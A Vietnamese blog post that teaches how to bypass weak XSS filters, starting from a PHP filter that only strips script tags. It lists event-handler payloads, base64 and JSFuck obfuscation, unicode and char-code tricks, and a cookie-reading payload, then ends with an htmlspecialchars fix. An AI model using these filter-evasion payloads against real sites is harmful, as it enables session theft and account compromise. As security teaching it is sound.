---
title: XSS Bypass
date: 2025-03-19 15:33:20
tags: [Blog, XSS]
categories: [Công nghệ, Lập trình, Security]
author: Đạt
description: Một số cách bypass XSS 
---


Có vô vàn cách filter XSS nhưng không phải cách nào cũng hiệu quả 
<h2>1. Filter script</h2>

```php
<?php
function filter($input) {
    return preg_replace('/<script/', '', $input);
}

if (isset($_GET['name'])) {
    echo 'Hello ' . filter($_GET['name']);
}
?>
```

Bạn nghĩ sao về đoạn mã này về việc phòng chống XSS 
Có bao nhiêu cách để bypass được đoạn mã này ?
<h3>Cách 1 : Thực thi script không nhất thiết phải có thẻ script </h3>

```html
<xml onreadystatechange=alert(1)></xml>

<style onload=alert(1)></style>

<iframe onload=alert(1)></iframe>

<img type=image src=valid.gif onreadystatechange=alert(1)>

<isindex type=image src=valid.gif onreadystatechange=alert(1)>

<script onreadystatechange=alert(1)></script>

<bgsound onpropertychange=alert(1)></bgsound>

<body onbeforeactivate=alert(1)></body>

<body onactivate=alert(1)></body>

<input autofocus onfocus=alert(1)>

<input onblur=alert(1) autofocus>

<body onscroll=alert(1)>
    <br><br>...
    <br><input autofocus>
</body>

<a onmousemove=alert(1)></a>

<audio src=1 onerror=alert(1)></audio>

<video src=1 onerror=alert(1)></video>

<iframe src=javascript:alert(1)></iframe>

<form id=test>
    <button form=test formaction=javascript:alert(1)></button>
</form>

<event-source src=valid.gif onreadystatechange=alert(1)></event-source>

<object onerror=alert(1)></object>

<object type=image src=valid.gif onreadystatechange=alert(1)></object>

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>

<embed src=javascript:alert(1)></embed>
```
Trick : Cách test XSS payload nhanh nhất là gán đoạn mã dưới đây lên url rồi thay đổi payload muốn test thôi. Đống payload trên có mấy cái không chạy được =)) 
```html
data:text/html,<script>alert('XSS!')</script>
```


<h3>Cách 2 : Server đã loại bỏ tất cả input có chứa script.  </h3>

    Cách này khá đơn gian, bypass đơn giản bằng cách thay script thành SCRIPT hoặc ScRiPt, …



<h3> Cách 3 : Nếu filter kí tự đặc biệt thì sao ? như filter dấu < > " / </h3>
Sử dụng base64 để bypass ( thực tế dùng khá nhiều và cũng là high level  )

Sử dụng combo này python này 
```python
javascript_code = base64.b64encode('alert(origin)'.encode("ascii")).decode("ascii") # encode alert(origin) YWxlcnQob3JpZ2luKQ==
PAYLOAD_XSS="<img src=aaa onerror=eval(atob('{}'))>".format(javascript_code) # input base64 vô đây
```
```html 
Ta được payload 
<img src=aaa onerror=eval(atob("YWxlcnQob3JpZ2luKQ=="))>

Test ngay 
data:text/html,<img src=aaa onerror=eval(atob("YWxlcnQob3JpZ2luKQ=="))>
```
Tuyệt ! thử nghiệm XSS thành công
<img src="/images/XSS-la-gi/4.png" />
<a href="data:text/html,<img src=aaa onerror=eval(atob('YWxlcnQob3JpZ2luKQ=='))>">Click vô đây để test </a>

Ở đây là cách dùng base64 nói riêng, hãy thay thế bằng các hàm mã hoá khác tương tự nhé 

<h3>Cách 4 : JSFuck </h3>

Nó liên quan đến trang https://jsfuck.com 
Ví dụ tôi có payload test sau 
```html
data:text/html,<svg onload='alert(1)'>
```
nhét cái alert(1) vào JSFuck ta được đồng hỗn độn 
<img src="/images/XSS-la-gi/5.png" />
```text
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+[+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
```
Vã luôn thôi 

```html
data:text/html,<svg onload='[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+[+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])'>
```
Chan đê...chan đê...


<h3>Cách 5 : Unichan code </h3>

Nó là unicode ạ =)) 

```html
data:text/html,<script>alert(origin)</script>
```
Ví dụ filter XSS bằng cách không cho dùng kí tự origin
-> bypass thành 
```html 
data:text/html,<script>alert(\u006frigin)</script>
```
<img src="/images/XSS-la-gi/6.png" />
Lưu ý : unicode chỉ dùng được cho các kí tự bên trong, như nếu dùng cho giá trị thẻ script thì không được
<img src="/images/XSS-la-gi/7.png" />


Nếu ta unicode giá trị alert và origin
```html
data:text/html,<script>\u0061\u006c\u0065\u0072\u0074(origin)</script>

data:text/html,<script>\u0061\u006c\u0065\u0072\u0074(\u006f\u0072\u0069\u0067\u0069\u006e)</script>    
// Dấu ( và ) phải được giữ nguyên vì unicode 2 cái dấu này thì không nhận đâu nhé -> payload lỏ luôn  
```
<img src="/images/XSS-la-gi/8.png" />

<h3>Cách 6 : Cộng chuỗi </h3>

Ví dụ nó filter XSS bằng cách không cho dùng kí tự origin

```html
data:text/html,<script>alert("ori"+"gin")</script>
```

<h3>Cách 7 : Char Code </h3>

Hiểu đơn giản là chuyển từ kí tự thành số tương ứng.
```javascript 
const str = "origin";
const charCodes = str.split("").map(char => char.charCodeAt(0));
console.log(charCodes);
```



coppy nguyên đống code này vào trong console của trình duyệt 
<img src="/images/XSS-la-gi/9.png" />


=> ta có payload hoàn chỉnh 
```html
data:text/html,<script>eval(alert(String.fromCharCode(111,114,105,103,105,110)))</script>
```

<h3>Sanitize kí tự quote,doublequote </h3>

quote,doublequote là ' và " nhé các quý đọc giả
Server phát hiện kí tự double quote và sanitize bằng cách thêm dấu \ phía trước.

Bypass bằng \”, kí tự \ đầu tiên sẽ triệt tiêu hiệu quả của dấu \ được chèn vào, nên “ vẫn có hiệu lực để unquote string.
Điểm yếu. nếu nó Sanitize 

<h3>Giới hạn số lượng đầu vào</h3>

<img src="/images/XSS-la-gi/10.png" />
Mục đích của đoạn mã: Nhận tham số name từ URL thông qua $_GET, sau đó giới hạn độ dài chuỗi đầu vào tối đa 41 ký tự và hiển thị kết quả.

Bypass: Chuyển Reflected XSS thành DOM based XSS

( Mình test thử cách này méo hoạt động nên không recomment cách này lắm )
```html 
data:text/html,eval(unescape(location)#%0Aalert(document.cookie)

data:text/html,<script>alert(document./*&age=*/cookie)</script>

```














Ok vậy thì cách fix như nào là hợp lý nhỉ ?
```php
<?php
function filter($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}

if (isset($_GET['name'])) {
    echo 'Hello ' . filter($_GET['name']);
}
?>
```

htmlspecialchars() giúp mã hóa các ký tự đặc biệt như < > " &, bảo vệ tốt hơn chống lại XSS.
